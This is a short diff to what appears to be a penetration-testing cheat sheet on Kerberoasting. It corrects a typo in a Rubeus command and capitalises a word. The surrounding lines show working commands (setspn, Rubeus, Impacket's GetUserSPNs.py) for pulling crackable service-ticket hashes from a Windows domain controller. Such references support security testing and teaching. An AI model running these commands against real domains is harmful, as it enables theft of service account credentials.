@@ -43,14 +43,14 @@ setspn -T <DC_hostname> -Q */*
 
 **Rubeus**
 ```powershell
-.\Rubeus.exe kerberoast /outfile:<filename.txt> /fromat:john
+.\Rubeus.exe kerberoast /outfile:<filename.txt> /format:john
 ```
 
 **Empire**
 Empire is another PowerShell library for post exploitation that includes a set of tools that can be used to get SPN records.
 
 **Impacket**
-It is a Python library hosting scripts that can interact with a Windows domain controller. For kerberoasting the script, GetUserSPNs.py can be used with any user's valid domain credentials.
+It is a Python library hosting scripts that can interact with a Windows domain controller. For Kerberoasting the script, GetUserSPNs.py can be used with any user's valid domain credentials.
 ```
 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain/username:password> -dc-ip <dc_IP> -request > output_hash.txt
 ```
